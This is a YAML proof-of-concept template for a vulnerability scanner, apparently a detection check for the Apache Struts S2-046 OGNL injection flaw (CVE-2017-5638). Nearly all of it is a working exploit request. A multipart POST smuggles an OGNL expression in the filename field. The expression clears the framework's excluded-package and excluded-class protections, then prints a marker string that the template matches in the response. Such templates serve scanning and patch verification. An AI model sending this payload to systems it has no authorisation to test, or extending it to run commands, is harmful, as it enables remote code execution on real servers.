id: poc-yaml-struts2-046-1
info:
  name: Apache Struts S2-046 OGNL表达式注入漏洞(CVE-2017-5638)
  severity: critical
  tags:
  - 两高一弱
  - 表达式注入
  - CVE-2017-5638
  finger: struts
  reference: []
  description: null
variables:
  r1: str("-----------------------------\r\nContent-Disposition:\x20form-data;\x20name=\"test\";\x20filename=\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}\x00b\"\r\nContent-Type:\x20text/plain\r\n\r\n\r\n-----------------------------")
transport: http
requests:
- method: POST
  path: /
  headers:
    Content-Type: multipart/form-data; boundary=---------------------------
  data: '{{.r1}}'
  redirect: false
  raw: null
  timeout: null
  expression: contains(body, "struts2_security_check")
  output: []
